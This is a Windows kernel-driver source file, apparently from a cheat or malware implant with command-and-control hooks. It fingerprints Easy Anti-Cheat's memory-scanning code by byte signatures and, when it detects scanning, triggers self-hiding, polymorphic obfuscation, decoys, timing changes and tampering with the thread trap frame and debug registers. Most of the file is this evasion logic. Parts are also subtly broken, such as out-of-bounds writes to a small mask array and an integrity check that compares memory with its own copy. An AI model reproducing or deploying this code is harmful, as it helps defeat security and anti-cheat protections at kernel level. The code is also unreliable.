#include "pattern_analysis.hpp"
#include "c2_comm.h"
#include <ntddk.h>
#include <intrin.h>
#include <stdlib.h>

#define MAX_EAC_REGIONS 128
#define EAC_SCAN_INTERVAL 1000 // 1 sec



extern "C" ULONG NTAPI RtlRandomEx(PULONG Seed);


typedef struct _DEFERRED_ACTION_ITEM {
    WORK_QUEUE_ITEM WorkItem;
    NeuralNetwork* Network;
    DEFERRED_ACTION Action;
} DEFERRED_ACTION_ITEM, * PDEFERRED_ACTION_ITEM;

typedef struct _EAC_MEMORY_REGION {
    PVOID BaseAddress;
    SIZE_T Size;
    ULONG Protection;
    BOOLEAN IsExecutable;
    BOOLEAN IsModified;
    ULONG LastAccessTime;
} EAC_MEMORY_REGION, * PEAC_MEMORY_REGION;

typedef struct _EAC_MONITOR_CONTEXT {
    KSPIN_LOCK Lock;
    EAC_MEMORY_REGION* Regions;
    ULONG RegionCount;
    ULONG MaxRegions;
    BOOLEAN IsMonitoring;
    KDPC MonitorDpc;
    KTIMER MonitorTimer;
    ULONG ScanInterval;
} EAC_MONITOR_CONTEXT, * PEAC_MONITOR_CONTEXT;



UCHAR PATTERN_MASKS_SEQ[] = {
    0xFF, 0xFF, 0xFF, 0x00, // First 3 bytes must match, 4th can vary
    0xFF, 0xFF, 0xFF, 0xFF  // All bytes must match
};


// Global variables for pattern tracking
static SIZE_T g_LastPatternOffset = 0;
static SIZE_T g_PatternInterval = 0;
static LARGE_INTEGER g_LastTimingAdjustment = { 0 };
static PATTERN_ANALYSIS_CONTEXT g_PatternContext = { 0 };
static EAC_MONITOR_CONTEXT g_EacMonitor = { 0 };

NTSTATUS InitializePatternAnalysisBuffers(void) {
    if (!g_PatternContext.Initialized) {
        KeInitializeSpinLock(&g_PatternContext.Lock);
        g_PatternContext.BufferSize = PAGE_SIZE;
        g_PatternContext.SafeBuffer = (PUCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED,
            g_PatternContext.BufferSize,
            'PATB');
        if (!g_PatternContext.SafeBuffer) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        g_PatternContext.Initialized = TRUE;
    }
    return STATUS_SUCCESS;
}

void CleanupPatternAnalysisContext(void) {
    if (g_PatternContext.SafeBuffer) {
        ExFreePool(g_PatternContext.SafeBuffer);
        g_PatternContext.SafeBuffer = NULL;
    }
    g_PatternContext.Initialized = FALSE;
}

static void ExecuteDeferredAction(PVOID Parameter) {
    PDEFERRED_ACTION_ITEM item = (PDEFERRED_ACTION_ITEM)Parameter;

    if (!item || !item->Network) {
        if (item) ExFreePool(item);
        return;
    }

    __try {
        switch (item->Action) {
        case ACTION_ADAPT_TECHNIQUES:
            NeuralNetwork_AdaptTechniques(item->Network);
            break;

        case ACTION_OBFUSCATE_MEMORY:
            NeuralNetwork_ObfuscateMemory(item->Network);
            break;

        case ACTION_PROTECT_THREAD:
            ProtectThreadContext(item->Network);
            break;

        case ACTION_HIDE_SELF:
            NeuralNetwork_HideSelf(item->Network);
            break;

        default:
            break;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        C2_DBG_PRINT("Exception in ExecuteDeferredAction: 0x%X\n", GetExceptionCode());
    }

    ExFreePool(item);
}

NTSTATUS QueueDeferredAction(NeuralNetwork* nn, DEFERRED_ACTION Action) {
    if (!nn) return STATUS_INVALID_PARAMETER;

    // Allocate work item context
    PDEFERRED_ACTION_ITEM actionItem = (PDEFERRED_ACTION_ITEM)ExAllocatePool2(
        POOL_FLAG_NON_PAGED,
        sizeof(DEFERRED_ACTION_ITEM),
        'DFAC'
    );

    if (!actionItem) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Initialize work item
    actionItem->Network = nn;
    actionItem->Action = Action;

    ExInitializeWorkItem(
        &actionItem->WorkItem,
        ExecuteDeferredAction,
        actionItem
    );

    // Queue the work item
    ExQueueWorkItem(&actionItem->WorkItem, DelayedWorkQueue);

    return STATUS_SUCCESS;
}


NTSTATUS AnalyzePatternContextEx(NeuralNetwork* nn, UCHAR* location, ULONG patternType) 
{
    if (!nn || !location || !g_PatternContext.Initialized) {
        return STATUS_INVALID_PARAMETER;
    }

    NTSTATUS status = STATUS_SUCCESS;
    KIRQL oldIrql;
    ULONG analyzedLength = 0;

    KeAcquireSpinLock(&g_PatternContext.Lock, &oldIrql);

    __try {
        // Validate location is within EAC driver range
        if ((ULONG_PTR)location < (ULONG_PTR)nn->eacDriverBase ||
            (ULONG_PTR)location >= (ULONG_PTR)nn->eacDriverBase + nn->eacDriverSize) {
            status = STATUS_INVALID_ADDRESS;
            __leave;
        }

        // Calculate safe boundaries
        SIZE_T maxOffset = min(16, (ULONG_PTR)location - (ULONG_PTR)nn->eacDriverBase);
        SIZE_T safeOffset = (location - 16 >= (UCHAR*)nn->eacDriverBase) ? 16 : maxOffset;
        SIZE_T safeLength = min(32, nn->eacDriverSize -
            ((SIZE_T)location - (SIZE_T)nn->eacDriverBase + safeOffset));

        if (safeLength == 0) {
            status = STATUS_BUFFER_TOO_SMALL;
            __leave;
        }

        // Clear analysis buffer
        RtlZeroMemory(g_PatternContext.SafeBuffer, g_PatternContext.BufferSize);

        // Safe memory probe and copy
        ProbeForRead(location - safeOffset, safeLength, 1);
        MM_COPY_ADDRESS sourceAddress;
        sourceAddress.VirtualAddress = location - safeOffset;
        status = MmCopyMemory(g_PatternContext.SafeBuffer,
            sourceAddress,
            safeLength,
            MM_COPY_MEMORY_VIRTUAL,
            (PSIZE_T)&analyzedLength);

        if (!NT_SUCCESS(status) || analyzedLength == 0) {
            __leave;
        }

        // Pattern analysis based on type
        switch (patternType) {
        case PATTERN_TYPE_MEMORY_SCAN:
            if (IsMemoryScanningSequence(g_PatternContext.SafeBuffer)) {
                InterlockedIncrement((volatile LONG*)&nn->eacDetectionCount);
                nn->detectionAttemptObserved = TRUE;
                QueueDeferredAction(nn, ACTION_ADAPT_TECHNIQUES);
            }
            break;

        case PATTERN_TYPE_ADDRESS_VALIDATION:
            if (IsAddressValidationSequence(g_PatternContext.SafeBuffer)) {
                QueueDeferredAction(nn, ACTION_OBFUSCATE_MEMORY);
            }
            break;

        case PATTERN_TYPE_THREAD_ANALYSIS:
            if (IsThreadAnalysisSequence(g_PatternContext.SafeBuffer)) {
                QueueDeferredAction(nn, ACTION_PROTECT_THREAD);
            }
            break;

        case PATTERN_TYPE_MODULE_VALIDATION:
            if (IsModuleValidationSequence(g_PatternContext.SafeBuffer)) {
                QueueDeferredAction(nn, ACTION_HIDE_SELF);
            }
            break;
        }

        // Record pattern for later analysis
        RecordPatternMatch(patternType, (SIZE_T)(location - (UCHAR*)nn->eacDriverBase),
            analyzedLength);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        C2_DBG_PRINT("Exception in AnalyzePatternContext: 0x%X\n", status);
    }

    KeReleaseSpinLock(&g_PatternContext.Lock, oldIrql);
    return status;
}
    

void AnalyzePatternDistribution(NeuralNetwork* nn, void* patterns, ULONG count) {
    if (!nn || !patterns || count == 0) return;

    __try {
        PatternStatistics statistics[10] = { 0 };
        DetectedPattern* detectedPatterns = (DetectedPattern*)patterns;


        // Calculate pattern distribution statistics
        for (ULONG i = 0; i < count; i++) {
            if (detectedPatterns[i].patternType < 10) {
                statistics[detectedPatterns[i].patternType].frequency++;
                statistics[detectedPatterns[i].patternType].avgOffset += detectedPatterns[i].offset;
            }
        }

        BOOLEAN intensiveScan = FALSE;
        BOOLEAN periodicScan = FALSE;
        BOOLEAN randomScan = FALSE;

        // Analyze patterns
        for (int i = 0; i < 10; i++) {
            if (statistics[i].frequency > 0) {
                statistics[i].avgOffset /= statistics[i].frequency;

                if (statistics[i].frequency > 10) intensiveScan = TRUE;
                if (statistics[i].frequency == 1) randomScan = TRUE;
                if (IsPeriodicPattern(statistics[i].avgOffset)) periodicScan = TRUE;
            }
        }

        // Apply defensive measures based on detection pattern
        if (intensiveScan) {
            NeuralNetwork_IncreasedEACMonitoring(nn);
            NeuralNetwork_ApplyPolymorphicObfuscation(nn);
            C2_DBG_PRINT("Intensive scanning detected - increasing protection\n");
        }
        else if (periodicScan) {
            AdjustTimingBehavior(nn);
            C2_DBG_PRINT("Periodic scanning detected - adjusting timing\n");
        }
        else if (randomScan) {
            NeuralNetwork_CreateDecoys(nn);
            C2_DBG_PRINT("Random scanning detected - creating decoys\n");
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        C2_DBG_PRINT("Exception in AnalyzePatternDistribution: 0x%X\n", GetExceptionCode());
    }
}

BOOLEAN IsMemoryScanningSequence(UCHAR* bytes) {
    if (!bytes) return FALSE;
    return RtlCompareMemory(bytes, EAC_MEMORY_SCAN_SEQ, sizeof(EAC_MEMORY_SCAN_SEQ)) == sizeof(EAC_MEMORY_SCAN_SEQ);
}

BOOLEAN IsAddressValidationSequence(UCHAR* bytes) {
    if (!bytes) return FALSE;
    return RtlCompareMemory(bytes, EAC_VALIDATION_SEQ, sizeof(EAC_VALIDATION_SEQ)) == sizeof(EAC_VALIDATION_SEQ);
}

BOOLEAN IsThreadAnalysisSequence(UCHAR* bytes) {
    if (!bytes) return FALSE;
    return RtlCompareMemory(bytes, EAC_THREAD_SCAN_SEQ, sizeof(EAC_THREAD_SCAN_SEQ)) == sizeof(EAC_THREAD_SCAN_SEQ);
}

BOOLEAN IsModuleValidationSequence(UCHAR* bytes) {
    if (!bytes) return FALSE;
    return RtlCompareMemory(bytes, EAC_MODULE_SCAN_SEQ, sizeof(EAC_MODULE_SCAN_SEQ)) == sizeof(EAC_MODULE_SCAN_SEQ);
}

BOOLEAN IsPeriodicPattern(SIZE_T offset) {
    if (g_LastPatternOffset == 0) {
        g_LastPatternOffset = offset;
        return FALSE;
    }

    SIZE_T currentInterval = offset - g_LastPatternOffset;
    BOOLEAN isPeriodic = (g_PatternInterval != 0 &&
        abs((int)(currentInterval - g_PatternInterval)) < 16);

    g_PatternInterval = currentInterval;
    g_LastPatternOffset = offset;

    return isPeriodic;
}

void ProtectThreadContext(NeuralNetwork* nn) {
    if (!nn) return;

    __try {
        // Raise IRQL to prevent thread scheduling
        KIRQL oldIrql = KeRaiseIrqlToDpcLevel();

        PKTHREAD currentThread = KeGetCurrentThread();
        if (currentThread) {
           
            PKTRAP_FRAME trapFrame = *(PKTRAP_FRAME*)((ULONG_PTR)currentThread + 0x1d8); // Offset may vary
            if (trapFrame) {
                // Modify non-critical parts of the trap frame to confuse scanners
                trapFrame->ErrorCode ^= 0xFFFFFFFF;
                trapFrame->Dr6 = 0;
                trapFrame->Dr7 = 0;
            }
        }

        KeLowerIrql(oldIrql);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        C2_DBG_PRINT("Exception in ProtectThreadContext: 0x%X\n", GetExceptionCode());
    }
}

void AdjustTimingBehavior(NeuralNetwork* nn) {
    if (!nn) return;

    LARGE_INTEGER currentTime;
    KeQuerySystemTime(&currentTime);

    if (currentTime.QuadPart - g_LastTimingAdjustment.QuadPart > 10000000) { // 1 second
        nn->memoryObfuscationLevel = min(nn->memoryObfuscationLevel + 1, 10);

        
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)RtlRandomEx(NULL) % 100000; // Random delay up to 10ms
        KeDelayExecutionThread(KernelMode, FALSE, &delay);

        g_LastTimingAdjustment = currentTime;
    }
}

VOID EACMonitorDpcRoutine( PKDPC Dpc, PVOID DeferredContext, PVOID SystemArgument1, PVOID SystemArgument2) {
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    KIRQL oldIrql;
    KeAcquireSpinLock(&g_EacMonitor.Lock, &oldIrql);

    for (ULONG i = 0; i < g_EacMonitor.RegionCount; i++) {
        PEAC_MEMORY_REGION region = &g_EacMonitor.Regions[i];

        __try {
            // Verify memory contents
            PUCHAR buffer = (PUCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                region->Size,
                'EACV');
            if (buffer) {
                ProbeForRead(region->BaseAddress, region->Size, 1);

                MM_COPY_ADDRESS sourceAddress;
                sourceAddress.VirtualAddress = region->BaseAddress;
                SIZE_T bytesRead;

                NTSTATUS status = MmCopyMemory(
                    buffer,
                    sourceAddress,
                    region->Size,
                    MM_COPY_MEMORY_VIRTUAL,
                    &bytesRead
                );

                if (NT_SUCCESS(status) && bytesRead == region->Size) {
                    // Check for modifications
                    if (region->IsExecutable) {
                        for (SIZE_T j = 0; j < region->Size; j++) {
                            if (((PUCHAR)region->BaseAddress)[j] != buffer[j]) {
                                region->IsModified = TRUE;
                                C2_DBG_PRINT("EAC region modification detected at offset %llu\n", j);
                                break;
                            }
                        }
                    }
                }

                ExFreePool(buffer);
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            region->Protection = 0;  // Mark as invalid
        }
    }

    // Requeue timer if still monitoring
    if (g_EacMonitor.IsMonitoring) {
        LARGE_INTEGER dueTime;
        dueTime.QuadPart = -10000LL * g_EacMonitor.ScanInterval;  // Convert to 100ns intervals
        KeSetTimer(&g_EacMonitor.MonitorTimer, dueTime, &g_EacMonitor.MonitorDpc);
    }

    KeReleaseSpinLock(&g_EacMonitor.Lock, oldIrql);
}

NTSTATUS InitializeEACMonitoring(void) {
    if (g_EacMonitor.Regions) {
        return STATUS_ALREADY_INITIALIZED;
    }

    g_EacMonitor.Regions = (PEAC_MEMORY_REGION)ExAllocatePool2(
        POOL_FLAG_NON_PAGED,
        sizeof(EAC_MEMORY_REGION) * MAX_EAC_REGIONS,
        'EACM'
    );

    if (!g_EacMonitor.Regions) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    RtlZeroMemory(g_EacMonitor.Regions, sizeof(EAC_MEMORY_REGION) * MAX_EAC_REGIONS);

    KeInitializeSpinLock(&g_EacMonitor.Lock);
    g_EacMonitor.MaxRegions = MAX_EAC_REGIONS;
    g_EacMonitor.RegionCount = 0;
    g_EacMonitor.ScanInterval = EAC_SCAN_INTERVAL;

    // Initialize DPC and Timer for periodic monitoring
    KeInitializeDpc(&g_EacMonitor.MonitorDpc, EACMonitorDpcRoutine, NULL);
    KeInitializeTimer(&g_EacMonitor.MonitorTimer);

    return STATUS_SUCCESS;
}

void CleanupEACMonitoring(void) {
    KIRQL oldIrql;
    KeAcquireSpinLock(&g_EacMonitor.Lock, &oldIrql);

    if (g_EacMonitor.IsMonitoring) {
        KeCancelTimer(&g_EacMonitor.MonitorTimer);
        g_EacMonitor.IsMonitoring = FALSE;
    }

    if (g_EacMonitor.Regions) {
        ExFreePool(g_EacMonitor.Regions);
        g_EacMonitor.Regions = NULL;
    }

    g_EacMonitor.RegionCount = 0;
    KeReleaseSpinLock(&g_EacMonitor.Lock, oldIrql);
}



NTSTATUS RegisterEACRegion(PVOID BaseAddress, SIZE_T Size, BOOLEAN IsExecutable) {
    if (!BaseAddress || !Size) {
        return STATUS_INVALID_PARAMETER;
     }

    KIRQL oldIrql;
    KeAcquireSpinLock(&g_EacMonitor.Lock, &oldIrql);

    if (g_EacMonitor.RegionCount >= g_EacMonitor.MaxRegions) {
        KeReleaseSpinLock(&g_EacMonitor.Lock, oldIrql);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    PEAC_MEMORY_REGION region = &g_EacMonitor.Regions[g_EacMonitor.RegionCount++];
    region->BaseAddress = BaseAddress;
    region->Size = Size;
    region->IsExecutable = IsExecutable;
    region->IsModified = FALSE;
    region->LastAccessTime = 0;

    // Start monitoring if this is the first region
    if (g_EacMonitor.RegionCount == 1 && !g_EacMonitor.IsMonitoring) {
        g_EacMonitor.IsMonitoring = TRUE;
        LARGE_INTEGER dueTime;
        dueTime.QuadPart = -10000LL * g_EacMonitor.ScanInterval;
        KeSetTimer(&g_EacMonitor.MonitorTimer, dueTime, &g_EacMonitor.MonitorDpc);
    }

    KeReleaseSpinLock(&g_EacMonitor.Lock, oldIrql);
    return STATUS_SUCCESS;
}

NTSTATUS SafeReadEACMemory(PVOID TargetAddress, PVOID Buffer, SIZE_T Size) {
    if (!TargetAddress || !Buffer || !Size) {
        return STATUS_INVALID_PARAMETER;
    }

    NTSTATUS status = STATUS_SUCCESS;
    PMDL mdl = NULL;
    PVOID mappedAddress = NULL;

    __try {
        // Create MDL for the target address
        mdl = IoAllocateMdl(TargetAddress, (ULONG)Size, FALSE, FALSE, NULL);
        if (!mdl) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        ProbeForRead(TargetAddress, Size, 1);
        MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);

        mappedAddress = MmMapLockedPagesSpecifyCache(
            mdl,
            KernelMode,
            MmNonCached,
            NULL,
            FALSE,
            NormalPagePriority
        );

        if (!mappedAddress) {
            status = STATUS_INSUFFICIENT_RESOURCES;
            __leave;
        }

        // Safe copy
        RtlCopyMemory(Buffer, mappedAddress, Size);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (mappedAddress) {
        MmUnmapLockedPages(mappedAddress, mdl);
    }

    if (mdl) {
        MmUnlockPages(mdl);
        IoFreeMdl(mdl);
    }

    return status;
}



BOOLEAN IsEACPattern(PUCHAR Address, SIZE_T Size) {
    if (!Address || Size < 7) return FALSE;

    __try {
        if (Address[0] == 0x48) {
            if (Address[1] == 0x8B) {
                if (Address[2] == 0x01 || Address[2] == 0x0D) {
                    if (Size > 4 && Address[3] == 0x48 && Address[4] == 0x85) {
                        RecordPatternMatch(0, (SIZE_T)Address, Size);
                        return TRUE;
                    }
                }
            }
            else if (Size > 3 && Address[1] == 0x83 && Address[2] == 0x3D) {
                RecordPatternMatch(4, (SIZE_T)Address, Size);
                return TRUE;
            }
            else if (Size > 4 && Address[1] == 0x89 && Address[2] == 0x5C && Address[3] == 0x24) {
                RecordPatternMatch(8, (SIZE_T)Address, Size);
                return TRUE;
            }
        }
        else if (Size > 3 && Address[0] == 0x65 && Address[1] == 0x48 && Address[2] == 0x8B) {
            RecordPatternMatch(2, (SIZE_T)Address, Size);
            return TRUE;
        }
        else if (Size > 3 && Address[0] == 0x4C && Address[1] == 0x8D && Address[2] == 0x5C) {
            RecordPatternMatch(11, (SIZE_T)Address, Size);
            return TRUE;
        }

        if (Size >= sizeof(EAC_MEMORY_SCAN_SEQ) &&
            RtlCompareMemory(Address, EAC_MEMORY_SCAN_SEQ, sizeof(EAC_MEMORY_SCAN_SEQ)) == sizeof(EAC_MEMORY_SCAN_SEQ)) {
            RecordPatternMatch(0, (SIZE_T)Address, Size);
            return TRUE;
        }

        if (Size >= sizeof(EAC_VALIDATION_SEQ) &&
            RtlCompareMemory(Address, EAC_VALIDATION_SEQ, sizeof(EAC_VALIDATION_SEQ)) == sizeof(EAC_VALIDATION_SEQ)) {
            RecordPatternMatch(1, (SIZE_T)Address, Size);
            return TRUE;
        }

        float entropy = CalculatePatternEntropy(Address, min(Size, 16));
        if (entropy > 3.0f && entropy < 4.5f) {
            static ULONG seed = 0;
            if (RtlRandomEx(&seed) % 100 < 30) {
                RecordPatternMatch(0xFF, (SIZE_T)Address, Size);
            }
            return TRUE;
        }

        return FALSE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

void UpdateEACPatterns() {
    static ULONG updateCounter = 0;
    static ULONG seed = 0;

    if (++updateCounter % 1000 != 0) return;

    __try {
        ULONG activePatterns = 0;
        ULONG frequentPatterns[12] = { 0 };

        for (ULONG i = 0; i < MAX_PATTERN_HISTORY; i++) {
            if (PatternHistory[i].isActive) {
                activePatterns++;
                if (PatternHistory[i].patternType < 12) {
                    frequentPatterns[PatternHistory[i].patternType]++;
                }
            }
        }

        for (ULONG i = 0; i < 12; i++) {
            if (frequentPatterns[i] > 5) {
                ULONG variation = RtlRandomEx(&seed) % 3;
                switch (variation) {
                case 0:
                    PATTERN_MASKS_SEQ[i * 4 + 3] = 0x0F;  
                    break;
                case 2:
                    for (ULONG j = 0; j < MAX_PATTERN_HISTORY; j++) {
                        if (PatternHistory[j].patternType == i) {
                            PatternHistory[j].isActive = FALSE;
                        }
                    }
                    break;
                }
            }
        }

        if (activePatterns > MAX_PATTERN_HISTORY * 0.8) {
            RtlZeroMemory(PatternHistory, sizeof(PatternHistory));
            PatternHistoryIndex = 0;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
}


// Helper function to verify pattern integrity
BOOLEAN VerifyPatternIntegrity() {
    for (ULONG i = 0; i < ARRAYSIZE(DETECTION_PATTERNS); i++) {
        if (DETECTION_PATTERNS[i].length > 16 || DETECTION_PATTERNS[i].length == 0) {
            C2_DBG_PRINT("Invalid pattern length at index %lu\n", i);
            return FALSE;
        }
    }
    return TRUE;
}

// Initialize pattern analysis system
NTSTATUS InitializePatternAnalysis() {
    NTSTATUS status;

    // Initialize pattern integrity
    if (!VerifyPatternIntegrity()) {
        return STATUS_INVALID_PARAMETER;
    }

    // Initialize buffers
    status = InitializePatternAnalysisBuffers();
    if (!NT_SUCCESS(status)) {
        return status;
    }

    // Initialize globals
    g_LastPatternOffset = 0;
    g_PatternInterval = 0;
    g_LastTimingAdjustment.QuadPart = 0;

    return STATUS_SUCCESS;
}